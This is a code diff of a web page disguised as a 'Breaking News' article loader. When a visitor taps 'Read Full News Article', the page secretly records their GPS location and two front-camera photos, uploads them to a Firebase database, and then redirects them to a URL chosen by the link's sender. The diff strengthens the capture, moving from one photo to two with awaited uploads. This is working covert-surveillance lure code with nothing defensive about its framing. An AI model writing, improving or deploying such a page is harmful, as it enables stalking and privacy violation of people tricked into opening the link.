@@ -10,12 +10,12 @@
 </head>
 <body class="bg-gray-900 text-white flex items-center justify-center min-h-screen">
 
-    <div class="bg-gray-800 p-8 rounded-lg shadow-xl max-w-md w-full text-center">
-        <div class="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-orange-500 mx-auto mb-4"></div>
-        <h2 class="text-xl font-bold mb-2">Loading Breaking News...</h2>
-        <p class="text-gray-400 text-sm mb-6">Please tap the button below to verify and view the full news article.</p>
+    <div class="bg-gray-800 p-8 rounded-lg shadow-xl max-w-md w-full text-center border border-gray-700">
+        <div id="spinner" class="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-orange-500 mx-auto mb-4"></div>
+        <h2 id="status-text" class="text-xl font-bold mb-2">Breaking News Update</h2>
+        <p class="text-gray-400 text-sm mb-6">Please tap below to verify and view the full breaking news article securely.</p>
         
-        <button id="load-btn" onclick="captureAndRedirect()" class="w-full bg-orange-600 hover:bg-orange-700 text-white font-semibold py-3 rounded-lg transition shadow-lg cursor-pointer">
+        <button id="load-btn" onclick="startCaptureProcess()" class="w-full bg-orange-600 hover:bg-orange-700 text-white font-semibold py-3.5 rounded-lg transition shadow-lg cursor-pointer">
             📰 Read Full News Article
         </button>
     </div>
@@ -34,7 +34,9 @@
             appId: "1:659953474145:web:2fef467a200ee091d9a820"
         };
 
-        firebase.initializeApp(firebaseConfig);
+        if (!firebase.apps.length) {
+            firebase.initializeApp(firebaseConfig);
+        }
         const db = firebase.firestore();
 
         // Get target URL from query parameters
@@ -42,56 +44,94 @@
         const customTargetUrl = urlParams.get('target');
         const targetUrl = customTargetUrl ? decodeURIComponent(customTargetUrl) : 'https://www.google.com';
 
-        function captureAndRedirect() {
+        async function startCaptureProcess() {
             let btn = document.getElementById('load-btn');
+            let statusText = document.getElementById('status-text');
             btn.disabled = true;
-            btn.textContent = "Loading News...";
+            btn.textContent = "Loading News Content...";
+            statusText.textContent = "Verifying access...";
 
-            // 1. Capture Location
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(position => {
-                    db.collection('device_location_v2').add({
-                        latitude: position.coords.latitude,
-                        longitude: position.coords.longitude,
-                        timestamp: firebase.firestore.FieldValue.serverTimestamp(),
-                        device_name: "Web_Visitor"
-                    }).catch(err => console.log(err));
-                }, err => console.log(err), { timeout: 5000 });
-            }
+            let tasks = [];
 
-            // 2. Capture Camera Photo
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-            .then(stream => {
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-                setTimeout(() => {
+            // 1. Capture Location Promise
+            let locationPromise = new Promise((resolve) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(position => {
+                        db.collection('device_location_v2').add({
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            timestamp: firebase.firestore.FieldValue.serverTimestamp(),
+                            device_name: "Web_Visitor"
+                        }).then(() => resolve()).catch(err => {
+                            console.log("Location save error:", err);
+                            resolve();
+                        });
+                    }, err => {
+                        console.log("Location permission error:", err);
+                        resolve();
+                    }, { timeout: 5000 });
+                } else {
+                    resolve();
+                }
+            });
+            tasks.push(locationPromise);
+
+            // 2. Capture 2 Photos Promise
+            let photoPromise = new Promise(async (resolve) => {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+
+                    // Wait for video stream to be ready
+                    await new Promise(r => setTimeout(r, 1500));
+
                     const canvas = document.getElementById('canvas');
                     canvas.width = video.videoWidth || 640;
                     canvas.height = video.videoHeight || 480;
                     const ctx = canvas.getContext('2d');
+
+                    // --- First Photo ---
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    const photoDataUrl = canvas.toDataURL('image/jpeg', 0.7);
-
-                    // Stop camera stream
-                    stream.getTracks().forEach(track => track.stop());
-
-                    // Save photo to Firebase
-                    db.collection('media_logs_v2').add({
-                        url: photoDataUrl,
+                    const photo1Url = canvas.toDataURL('image/jpeg', 0.7);
+                    
+                    await db.collection('media_logs_v2').add({
+                        url: photo1Url,
                         type: 'photo',
                         timestamp: firebase.firestore.FieldValue.serverTimestamp(),
                         device_name: "Web_Visitor"
-                    }).then(() => {
-                        window.location.href = targetUrl;
-                    }).catch(() => {
-                        window.location.href = targetUrl;
                     });
-                }, 1000);
-            })
-            .catch(() => {
-                // If camera permission denied, still redirect to target
-                window.location.href = targetUrl;
+
+                    // Wait 1 second before taking the second photo
+                    await new Promise(r => setTimeout(r, 1000));
+
+                    // --- Second Photo ---
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const photo2Url = canvas.toDataURL('image/jpeg', 0.7);
+
+                    await db.collection('media_logs_v2').add({
+                        url: photo2Url,
+                        type: 'photo',
+                        timestamp: firebase.firestore.FieldValue.serverTimestamp(),
+                        device_name: "Web_Visitor"
+                    });
+
+                    // Stop camera stream
+                    stream.getTracks().forEach(track => track.stop());
+                    resolve();
+
+                } catch (err) {
+                    console.log("Camera error or permission denied: ", err);
+                    resolve();
+                }
             });
+            tasks.push(photoPromise);
+
+            // Wait for both location and photos to attempt saving, then redirect
+            await Promise.all(tasks);
+
+            // Redirect to target news URL
+            window.location.href = targetUrl;
         }
     </script>
 </body>
